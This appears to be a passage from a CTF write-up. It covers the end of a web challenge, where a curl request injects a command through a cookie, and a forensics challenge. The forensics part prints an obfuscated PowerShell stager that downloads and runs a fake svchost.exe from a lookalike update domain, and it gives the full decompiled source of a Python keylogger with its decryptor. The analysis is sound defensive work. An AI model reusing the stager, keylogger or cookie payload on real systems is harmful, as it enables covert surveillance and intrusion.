+</span><span style=color:#ae81ff></span>    -H <span style=color:#e6db74>$&#39;Connection: close&#39;</span> <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>    -H <span style=color:#e6db74>$&#39;Upgrade-Insecure-Requests: 1&#39;</span> <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>    -H <span style=color:#e6db74>$&#39;Cache-Control: max-age=0&#39;</span> <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>    -b <span style=color:#e6db74>&#34;blog_session=eyJpdiI6Ikg3bmhiWm5iSFpRK29jTjU5VDNjSGc9PSIsInZhbHVlIjoiZGswbFBGMlFSclBOOFQ1Q1J1c0dXaEtpZGtYaFJHck5vaDBUd3lRb3NXalBKMFJFTmJmY3VSSTF0TDlBMjdyZlFSZXdqR1RueVZ4REIwTkFhRFhHWHc9PSIsIm1hYyI6ImJmY2VkZmQxYmE2YTMyZDY5OGVmNDAwMjA5MzQzODY2ZTY5MzY1YWUxMDZhMzExYTIwYTkyOTI2MzE3YTJmZDQifQ%3D%3D; CHUy1XJywSReivL5QDrK8y3MhKPuH0JNbJ7kk2xB=</span><span style=color:#66d9ef>$(</span>php poc.php<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>    <span style=color:#e6db74>$&#39;http://142.93.38.188:31631/&#39;</span>
+</code></pre></div><p>Flag: <code>HTB{0ff_by_sl4sh_pwn4g3}</code></p>
+<h2 id=forensicsdfir>forensics/DFIR</h2>
+<ul>
+<li>Name: DFIR</li>
+<li>Category: forensics</li>
+<li>Solves: 29</li>
+<li>Rating 2/4</li>
+<li>Type: ~8GB OVA download</li>
+<li>Description: I have always heard stories about blue windows popping up during the startup and what that means but I never though it could happen to me. Please have a look and let me know if you find something. The user&rsquo;s password is: Passw0rd! <a href=http://138.68.175.191/businessctf/dfir/>http://138.68.175.191/businessctf/dfir/</a></li>
+</ul>
+<hr>
+<p>This challenge being an OVA download started off really frustrating. In fact, <em>somehow</em> I managed to bork my local VMWare trying to import it, and when it finally did come up, the VM just never booted. So, I finally downloaded VirtualBox and with some patience, got it to boot. :( The VM would randomly lock up for a few seconds under load, or do strange things like lock up left click as if I&rsquo;m holding down the mouse button. This made for an&mldr; interesting computering experience&mldr; Anyways!</p>
+<p>The challenge description said something about windows popping up at start up, and &lsquo;lo and behold, a PowerShell window appeared during the excruciatingly slow boot of the VM. I figured the best way I would find out what may be causing that was to use the <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns>Sysinternals Autoruns</a> tool.</p>
+<p>After not too long, I spotted an oddly named Scheduled Task that runs PowerShell:</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_dfir_1.png>
+</figure>
+<p>The arguments to the invocation of PowerShell in that tiny, tiny box were:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>-w hidden -ExecutionPolicy Bypass -nop -NoExit 
+-C Write-host <span style=color:#e6db74>&#39;Windows update ready&#39;</span>; iex (<span style=color:#66d9ef>[System.Text.Encoding]</span>::UTF8.GetString(<span style=color:#66d9ef>[System.Convert]</span>::FromBase64String((Get-ItemProperty HKCU<span style=color:#960050;background-color:#1e0010>:</span>\Software\1X90wOyH).Q4josQ44)));
+</code></pre></div><p>Looked like it was reading something from the registry. Being the lazy person I am, I reused the code to get me the value it was reading:</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_dfir_2.png>
+</figure>
+<p>This time round we got some lightly obfuscated PowerShell.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>${P`ATH} = (((<span style=color:#e6db74>&#34;{9}{2}{1}{8}{5}{6}{10}{4}{3}{7}{0}{11}&#34;</span> <span style=color:#f92672>-f</span><span style=color:#e6db74>&#39;ost.&#39;</span>,<span style=color:#e6db74>&#39;gramD&#39;</span>,<span style=color:#e6db74>&#39;Pro&#39;</span>,<span style=color:#e6db74>&#39;svc&#39;</span>,<span style=color:#e6db74>&#39;ndows{0}&#39;</span>,<span style=color:#e6db74>&#39;ta{&#39;</span>,<span style=color:#e6db74>&#39;0&#39;</span>,<span style=color:#e6db74>&#39;h&#39;</span>,<span style=color:#e6db74>&#39;a&#39;</span>,<span style=color:#e6db74>&#39;C:{0}&#39;</span>,<span style=color:#e6db74>&#39;}wi&#39;</span>,<span style=color:#e6db74>&#39;exe&#39;</span>)) <span style=color:#f92672>-f</span>  <span style=color:#66d9ef>[chAR]</span>92);${e`XISTs} = .(<span style=color:#e6db74>&#34;{1}{0}{2}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;est-Pa&#39;</span>,<span style=color:#e6db74>&#39;T&#39;</span>,<span style=color:#e6db74>&#39;th&#39;</span>) -Path ${p`AtH} -PathType (<span style=color:#e6db74>&#34;{1}{0}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;eaf&#39;</span>,<span style=color:#e6db74>&#39;L&#39;</span>);${Par`T1} = <span style=color:#e6db74>&#34;HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_&#34;</span>;<span style=color:#66d9ef>if</span> ( ${exi`stS} ){ &amp;(<span style=color:#e6db74>&#34;{3}{2}{1}{0}&#34;</span><span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;ess&#39;</span>,<span style=color:#e6db74>&#39;oc&#39;</span>,<span style=color:#e6db74>&#39;t-Pr&#39;</span>,<span style=color:#e6db74>&#39;Star&#39;</span>) ${pa`Th}}<span style=color:#66d9ef>else</span>{&amp;(<span style=color:#e6db74>&#34;{1}{0}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;ir&#39;</span>,<span style=color:#e6db74>&#39;mkd&#39;</span>) (((<span style=color:#e6db74>&#34;{3}{5}{4}{0}{1}{2}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;Datadt&#39;</span>,<span style=color:#e6db74>&#39;Qw&#39;</span>,<span style=color:#e6db74>&#39;indows&#39;</span>,<span style=color:#e6db74>&#39;C:dtQP&#39;</span>,<span style=color:#e6db74>&#39;m&#39;</span>,<span style=color:#e6db74>&#39;rogra&#39;</span>)).<span style=color:#e6db74>&#34;rePl</span><span style=color:#ae81ff>`A</span><span style=color:#e6db74>cE&#34;</span>((<span style=color:#66d9ef>[CHAr]</span>100+<span style=color:#66d9ef>[CHAr]</span>116+<span style=color:#66d9ef>[CHAr]</span>81),<span style=color:#e6db74>&#39;\&#39;</span>));&amp;(<span style=color:#e6db74>&#34;{1}{4}{3}{0}{2}&#34;</span> <span style=color:#f92672>-f</span><span style=color:#e6db74>&#39;eb&#39;</span>,<span style=color:#e6db74>&#39;I&#39;</span>,<span style=color:#e6db74>&#39;Request&#39;</span>,<span style=color:#e6db74>&#39;voke-W&#39;</span>,<span style=color:#e6db74>&#39;n&#39;</span>) -Uri (<span style=color:#e6db74>&#34;{2}{0}{8}{3}{1}{6}{5}{4}{7}&#34;</span> <span style=color:#f92672>-f</span><span style=color:#e6db74>&#39;ttps://win&#39;</span>,<span style=color:#e6db74>&#39;eupdater&#39;</span>,<span style=color:#e6db74>&#39;h&#39;</span>,<span style=color:#e6db74>&#39;owsliv&#39;</span>,<span style=color:#e6db74>&#39;ho&#39;</span>,<span style=color:#e6db74>&#39;c&#39;</span>,<span style=color:#e6db74>&#39;.com/sv&#39;</span>,<span style=color:#e6db74>&#39;st.exe&#39;</span>,<span style=color:#e6db74>&#39;d&#39;</span>) -OutFile ${PA`TH};.(<span style=color:#e6db74>&#34;{3}{2}{1}{0}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;Process&#39;</span>,<span style=color:#e6db74>&#39;-&#39;</span>,<span style=color:#e6db74>&#39;rt&#39;</span>,<span style=color:#e6db74>&#39;Sta&#39;</span>) ${p`ATh}}
+</code></pre></div><p>Cleaning that up a bit, we can see that a file in <code>C:\ProgramData\windows\svchost.exe</code> was being run. If it did not exist, it would have been downloaded from somewhere. For the most part, I just grabbed parts of the script and evaluated them in the PowerShell prompt to see the output to determine values:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># C:\ProgramData\windows\svchost.exe</span>
+${P`ATH} = (((<span style=color:#e6db74>&#34;{9}{2}{1}{8}{5}{6}{10}{4}{3}{7}{0}{11}&#34;</span> <span style=color:#f92672>-f</span><span style=color:#e6db74>&#39;ost.&#39;</span>,<span style=color:#e6db74>&#39;gramD&#39;</span>,<span style=color:#e6db74>&#39;Pro&#39;</span>,<span style=color:#e6db74>&#39;svc&#39;</span>,<span style=color:#e6db74>&#39;ndows{0}&#39;</span>,<span style=color:#e6db74>&#39;ta{&#39;</span>,<span style=color:#e6db74>&#39;0&#39;</span>,<span style=color:#e6db74>&#39;h&#39;</span>,<span style=color:#e6db74>&#39;a&#39;</span>,<span style=color:#e6db74>&#39;C:{0}&#39;</span>,<span style=color:#e6db74>&#39;}wi&#39;</span>,<span style=color:#e6db74>&#39;exe&#39;</span>)) <span style=color:#f92672>-f</span>  <span style=color:#66d9ef>[chAR]</span>92);
+
+<span style=color:#75715e># True | testing for upper path</span>
+${e`XISTs} = .(<span style=color:#e6db74>&#34;{1}{0}{2}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;est-Pa&#39;</span>,<span style=color:#e6db74>&#39;T&#39;</span>,<span style=color:#e6db74>&#39;th&#39;</span>) -Path ${p`AtH} -PathType (<span style=color:#e6db74>&#34;{1}{0}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;eaf&#39;</span>,<span style=color:#e6db74>&#39;L&#39;</span>);
+${Par`T1} = <span style=color:#e6db74>&#34;HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_&#34;</span>;
+
+<span style=color:#66d9ef>if</span> ( ${exi`stS} ){ 
+    &amp;(<span style=color:#e6db74>&#34;{3}{2}{1}{0}&#34;</span><span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;ess&#39;</span>,<span style=color:#e6db74>&#39;oc&#39;</span>,<span style=color:#e6db74>&#39;t-Pr&#39;</span>,<span style=color:#e6db74>&#39;Star&#39;</span>) ${pa`Th}
+}<span style=color:#66d9ef>else</span>{
+    <span style=color:#75715e># mkdir c:\programdata\windows?</span>
+    &amp;(<span style=color:#e6db74>&#34;{1}{0}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;ir&#39;</span>,<span style=color:#e6db74>&#39;mkd&#39;</span>) (((<span style=color:#e6db74>&#34;{3}{5}{4}{0}{1}{2}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;Datadt&#39;</span>,<span style=color:#e6db74>&#39;Qw&#39;</span>,<span style=color:#e6db74>&#39;indows&#39;</span>,<span style=color:#e6db74>&#39;C:dtQP&#39;</span>,<span style=color:#e6db74>&#39;m&#39;</span>,<span style=color:#e6db74>&#39;rogra&#39;</span>)).<span style=color:#e6db74>&#34;rePl</span><span style=color:#ae81ff>`A</span><span style=color:#e6db74>cE&#34;</span>((<span style=color:#66d9ef>[CHAr]</span>100+<span style=color:#66d9ef>[CHAr]</span>116+<span style=color:#66d9ef>[CHAr]</span>81),<span style=color:#e6db74>&#39;\&#39;</span>));
+
+    &amp;(<span style=color:#e6db74>&#34;{1}{4}{3}{0}{2}&#34;</span> <span style=color:#f92672>-f</span><span style=color:#e6db74>&#39;eb&#39;</span>,<span style=color:#e6db74>&#39;I&#39;</span>,<span style=color:#e6db74>&#39;Request&#39;</span>,<span style=color:#e6db74>&#39;voke-W&#39;</span>,<span style=color:#e6db74>&#39;n&#39;</span>) -Uri (<span style=color:#e6db74>&#34;{2}{0}{8}{3}{1}{6}{5}{4}{7}&#34;</span> <span style=color:#f92672>-f</span><span style=color:#e6db74>&#39;ttps://win&#39;</span>,<span style=color:#e6db74>&#39;eupdater&#39;</span>,<span style=color:#e6db74>&#39;h&#39;</span>,<span style=color:#e6db74>&#39;owsliv&#39;</span>,<span style=color:#e6db74>&#39;ho&#39;</span>,<span style=color:#e6db74>&#39;c&#39;</span>,<span style=color:#e6db74>&#39;.com/sv&#39;</span>,<span style=color:#e6db74>&#39;st.exe&#39;</span>,<span style=color:#e6db74>&#39;d&#39;</span>) -OutFile ${PA`TH};
+
+    .(<span style=color:#e6db74>&#34;{3}{2}{1}{0}&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#39;Process&#39;</span>,<span style=color:#e6db74>&#39;-&#39;</span>,<span style=color:#e6db74>&#39;rt&#39;</span>,<span style=color:#e6db74>&#39;Sta&#39;</span>) ${p`ATh}
+}
+</code></pre></div><p>This snippet also gave us what looked like the first part of the flag: <code>HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_</code>. Neat, looks like there is a part 2.</p>
+<p>From here, focus shifted to that <code>svchost.exe</code> binary that lived in <code>C:\ProgramData\Windows</code>. Just running it resulted in no output, both by double clicking or running it in <code>cmd.exe</code>. I dropped the binary in <a href=https://cutter.re/>Cutter</a>, but it was pretty big.</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_dfir_4.png>
+</figure>
+<p>After spending some time reversing, trying to make sense of the binary, I did come across some references to a Python VM. Geez.</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_dfir_5.png>
+</figure>
+<p>At this point I figured surely, for a 2/4 difficulty challenge I don&rsquo;t have to dive this deep? So instead, I opted for some good &lsquo;ol procmon! I renamed the binary in the ProgramData folder to <code>svchost1.exe</code> to make filtering a little easier.</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_dfir_6.png>
+</figure>
+<p>This time round I could see the Python usage a <em>lot</em> faster, with the added bonus of an idea where the runtime was located; <code>C:\Users\IEUser\AppData\Local\Temp\_MEI5882</code>. Many calls to read cryptography related (by name) files ending in <code>.pyd</code> were also seen.</p>
+<p>Each invocation of <code>svchost.exe</code> (or <code>svchost1.exe</code> in my renamed case) would have a new folder created in the <code>Temp\</code> directory with a similar <code>_MEI...</code> format. Anyways, with this folder in mind I copied out the files onto my host for investigation. I was a little worried here as I know it’s possible to obtain source code from Python&rsquo;s <code>.pyc</code> files, but I have not seen <code>.pyd</code>&rsquo;s before.</p>
+<p>A lot of time later, I kind of gave up on the hope of getting source code. Drat. It helped knowing that there were artifacts coming from the binary itself, so I did not go back to trying to reverse the binary further.</p>
+<p>For plan B, I opted to get <a href=http://www.rohitab.com/apimonitor>API Monitor</a> running. Even if a Python VM was used, calls out to the Windows API would still be interesting to see with some argument data. And oh boy was it interesting. It took me a while to understand the API Monitor workflow, but before long I was able to get <code>svchost.exe</code> loaded and running.</p>
+<p>The first major observation was that not long after the process starts up, a second thread boots up. The first thread can be seen reading the <code>python37.dll</code>, where after a while <code>DllMain</code> is called. My hypothesis at this point was that the actual logic being executed would be in the second thread, with the first just being a bootstrap phase for the Python VM.</p>
+<p>The second observation was in the second thread, where a file at <code>C:\Users\IEUser\AppData\Roaming/anVzdGFuW1l.txt</code> was being referenced.</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_dfir_7.png>
+</figure>
+<p>This was a new file that I had not previously discovered, so I went looking for what’s inside!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>b&#39;sm+3e2dfsjht3Y2BgddPVlGLMtYSLuXAvcuTwGwVQQYx7mn0QZ5JxNKYBBAaLgrYeoe3OOMRv9Gm9amegVnMZfxy0Qm5OTccBs0ldLsTj8uiuHAzvT6Lo6DdSWkYjaSad0tS1TT7g3crzpLqGm3BLG2owBvbftU3uTeItXKey/KPUjgaDWMbUA9c0/jIzNM=&#39;
+b&#39;s3Zs18MrewFI6qjX6Oa9+jF8ugOEwdzqtcnVRRskAnXrwQ9UataGcUduhwFXLCARsqw3NaK0Xv7e69xbcj0z2To3k4D7sIw=&#39;
+b&#39;tEcxPY3ltJsHDRsDsg==&#39;
+b&#39;tV+IdIZdzTwRbg7M&#39;
+b&#39;tjre2wAnnPYsV9Fi&#39;
+b&#39;t8DXhB0vUlDETcoV&#39;
+b&#39;uA9TSu+WUuoJqUP6&#39;
+b&#39;uZ3bfrTM8sNt15HB&#39;
+b&#39;sRBm6KWZigygdqvPZw==&#39;
+
+...
+</code></pre></div><p>Lots of strings that appear to be base64 encoded, with a Python <a href=https://docs.python.org/3/library/stdtypes.html#bytes-objects>Bytes Object</a> <code>b''</code> in front of them. Seeing this with the crypto related files read in the earlier Procmon output made it pretty clear that these were encrypted. But how? And what <em>are</em> they?</p>
+<p>I can bore you with the details of the next section, but I&rsquo;ll skip to the chase. In my clicking around, wondering about what’s going on and what my next move could be, I notice the following in API Monitor.</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_dfir_8.png>
+</figure>
+<p>A call to <code>MapVirtualKeyExW</code>!? A keylogger!? I tested a few things to make sure I wasn&rsquo;t going crazy, but yeah, this app was capturing keystrokes. Ok! Looking back at <code>anVzdGFuW1l.txt</code>, I noticed that after each press of the ENTER key, a new encrypted line would get written to the file (I used <a href=https://www.baremetalsoft.com/baretail/>baretail</a> to tail the fail as I pressed keys). This didn’t get me any closer to the solve yet, but at least I have a much better idea what the application was doing, just by watching Windows API calls. Pretty cool!</p>
+<p>Eventually I wondered how they could have built the application, and it being Python and all I recalled a thing called <a href=https://www.pyinstaller.org/>Pyinstaller</a>. Essentially, you can create Windows executables from Python projects. Next, I wondered if there were tools that could extract objects/code from a Pyinstaller generated exe (assuming a bit that this was how <code>svchost.exe</code> was built), and came across a project called <a href=https://github.com/extremecoders-re/pyinstxtractor>pyinstxtractor</a>. I quickly set that up and ran it. This time round I had more python files than those I found in the <code>_MEI5882</code> temp folder! In fact, there were some <code>.pyc</code> files now!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>❯ cd svchost.exe_extracted
+❯ ll
+Permissions Size User    Date Modified Name
+.rw-r--r--   95k leonjza 25 Jul 14:56  _bz2.pyd
+.rw-r--r--  133k leonjza 25 Jul 14:56  _ctypes.pyd
+.rw-r--r--   39k leonjza 25 Jul 14:56  _hashlib.pyd
+.rw-r--r--  176k leonjza 25 Jul 14:56  _lzma.pyd
+.rw-r--r--   28k leonjza 25 Jul 14:56  _queue.pyd
+.rw-r--r--   77k leonjza 25 Jul 14:56  _socket.pyd
+.rw-r--r--  121k leonjza 25 Jul 14:56  _ssl.pyd
+.rw-r--r--  778k leonjza 25 Jul 14:56  base_library.zip
+drwxr-xr-x     - leonjza 25 Jul 14:56  Crypto
+.rw-r--r--  3.4M leonjza 25 Jul 14:56  libcrypto-1_1.dll
+.rw-r--r--  689k leonjza 25 Jul 14:56  libssl-1_1.dll
+.rw-r--r--  2.2k leonjza 25 Jul 15:09  logger.pyc
+.rw-r--r--  203k leonjza 25 Jul 14:56  pyexpat.pyd
+.rw-r--r--     0 leonjza 25 Jul 14:56  pyi-windows-manifest-filename svchost.exe.manifest
+.rw-r--r--  4.1k leonjza 25 Jul 14:56  pyiboot01_bootstrap.pyc
+.rw-r--r--  1.8k leonjza 25 Jul 14:56  pyimod01_os_path.pyc
+.rw-r--r--  8.8k leonjza 25 Jul 14:56  pyimod02_archive.pyc
+.rw-r--r--   13k leonjza 25 Jul 14:56  pyimod03_importers.pyc
+.rw-r--r--  3.8M leonjza 25 Jul 14:56  python37.dll
+.rw-r--r--  1.4M leonjza 25 Jul 14:56  PYZ-00.pyz
+drwxr-xr-x     - leonjza 25 Jul 14:56  PYZ-00.pyz_extracted
+.rw-r--r--   27k leonjza 25 Jul 14:56  select.pyd
+.rw-r--r--   297 leonjza 25 Jul 14:56  struct.pyc
+.rw-r--r--  1.5k leonjza 25 Jul 14:56  svchost.exe.manifest
+.rw-r--r--  1.1M leonjza 25 Jul 14:56  unicodedata.pyd
+.rw-r--r--   88k leonjza 25 Jul 14:56  VCRUNTIME140.dll
+</code></pre></div><p>To recover the source code from a <code>.pyc</code> file, one could use a tool called <a href=https://github.com/rocky/python-uncompyle6>uncompyle6</a>. Much like how pyinstxtractor took the original exe and did the extraction, uncompyl6 takes a pyc and tries and rebuild the original source file from the byte code. Unfortunately, I could decode all of the <code>.pyc</code> files, except for <code>logger.pyc</code>. A quick look at the headers of both files, and I thankfully spotted that just the first byte of <code>logger.pyc</code> differed from a file like <code>struct.pyc</code> which we <em>could</em> decompile.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>❯ xxd logger.pyc | head
+00000000: 610d 0d0a 0000 0000 0000 0000 0000 0000  a...............
+00000010: e300 0000 0000 0000 0000 0000 0004 0000  ................
+
+❯ xxd struct.pyc
+00000000: 420d 0d0a 0000 0000 7079 6930 1001 0000  B.......pyi0....
+00000010: e300 0000 0000 0000 0000 0000 0008 0000  ................
+</code></pre></div><p>Using a hex editor I swapped the <code>0x61</code> for a <code>0x42</code>, and viola, uncompyle6 was happy! The extracted source code was:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># uncompyle6 version 3.7.5.dev0</span>
+<span style=color:#75715e># Python bytecode 3.7 (3394)</span>
+<span style=color:#75715e># Decompiled from: Python 3.8.11 (default, Jul 22 2021, 15:32:17)</span>
+<span style=color:#75715e># [GCC 8.3.0]</span>
+<span style=color:#75715e># Embedded file name: logger.py</span>
+<span style=color:#f92672>from</span> pynput.keyboard <span style=color:#f92672>import</span> Listener
+<span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
+<span style=color:#f92672>import</span> base64<span style=color:#f92672>,</span> os
+
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Strokes</span>(object):
+    message: dict
+    text: str
+    counter: int
+
+    <span style=color:#66d9ef>def</span> __init__(self) <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>None</span>:
+        self<span style=color:#f92672>.</span>message <span style=color:#f92672>=</span> {}
+        self<span style=color:#f92672>.</span>text <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+        self<span style=color:#f92672>.</span>counter <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>addToText</span>(self, new_text: str) <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>None</span>:
+        self<span style=color:#f92672>.</span>text <span style=color:#f92672>+=</span> new_text
+
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>addTextToDict</span>(self) <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>None</span>:
+        self<span style=color:#f92672>.</span>message[self<span style=color:#f92672>.</span>counter] <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>text
+        self<span style=color:#f92672>.</span>counter <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>clearText</span>(self) <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>None</span>:
+        self<span style=color:#f92672>.</span>text <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+
+    <span style=color:#a6e22e>@staticmethod</span>
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt</span>(text: bytes) <span style=color:#f92672>-&gt;</span> bytes:
+        key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;w0MrV1vBmZi1Z17v&#39;</span>
+        iv <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Kh54H8JTmOYq5mre&#39;</span>
+        cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>), AES<span style=color:#f92672>.</span>MODE_CFB, iv<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
+        <span style=color:#66d9ef>return</span> base64<span style=color:#f92672>.</span>b64encode(cipher<span style=color:#f92672>.</span>encrypt(text))
+
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>keystrokes</span>(key: str, obj: object) <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>None</span>:
+    key <span style=color:#f92672>=</span> str(key)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;&#39;&#34;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
+    obj<span style=color:#f92672>.</span>addToText(key)
+    <span style=color:#66d9ef>if</span> key <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;Key.enter&#39;</span>:
+        obj<span style=color:#f92672>.</span>addTextToDict()
+        open(os<span style=color:#f92672>.</span>getenv(<span style=color:#e6db74>&#39;APPDATA&#39;</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;/anVzdGFuW1l.txt&#39;</span>, <span style=color:#e6db74>&#39;a&#39;</span>)<span style=color:#f92672>.</span>write(str(Strokes<span style=color:#f92672>.</span>encrypt(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>str(obj<span style=color:#f92672>.</span>counter)<span style=color:#e6db74>}</span><span style=color:#e6db74>:</span><span style=color:#e6db74>{</span>obj<span style=color:#f92672>.</span>text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+        obj<span style=color:#f92672>.</span>clearText()
+
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>() <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>None</span>:
+    obj <span style=color:#f92672>=</span> Strokes()
+    <span style=color:#66d9ef>with</span> Listener(on_press<span style=color:#f92672>=</span>(<span style=color:#66d9ef>lambda</span> event: keystrokes(event, obj))) <span style=color:#66d9ef>as</span> (log):
+        log<span style=color:#f92672>.</span>join()
+
+
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+    main()
+</code></pre></div><p>Here we could see eveything we needed to both understand the behaviour we saw in API monitor, but also to decrypt the contents of those strings in <code>anVzdGFuW1l.txt</code>. I reused the code from <code>logger.py</code> to write a quick decryptor for the strings we had.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
+<span style=color:#f92672>import</span> base64<span style=color:#f92672>,</span> os
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(text: bytes) <span style=color:#f92672>-&gt;</span> bytes:
+    key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;w0MrV1vBmZi1Z17v&#39;</span>
+    iv <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Kh54H8JTmOYq5mre&#39;</span>
+    cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>), AES<span style=color:#f92672>.</span>MODE_CFB, iv<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
+    <span style=color:#66d9ef>return</span> cipher<span style=color:#f92672>.</span>decrypt(base64<span style=color:#f92672>.</span>b64decode(text))
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>() <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>None</span>:
+
+    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;anVzdGFuW1l.txt&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+        source <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
+
+    <span style=color:#66d9ef>for</span> l <span style=color:#f92672>in</span> source:
+        e <span style=color:#f92672>=</span> l<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;&#39;&#34;</span>)[<span style=color:#ae81ff>1</span>]
+        print(decrypt(e))
+
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+    main()
+</code></pre></div><p>The results were&mldr; the keyloggers input!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>b&#39;2:google.comKey.enter&#39;
+b&#39;3:gmailKey.enter&#39;
+b&#39;4:aedwardsKey.shift@icorp.comKey.enter&#39;
+b&#39;5:Key.shiftKey.shiftKey.shiftKey.shiftKey.shiftKey.shiftFORGOTTENKey.spaceKey.shiftHARDKey.spaceKey.shiftDRIVEKey.enter&#39;
+b&#39;6:Key.shiftHelloKey.spaceeddie,Key.enter&#39;
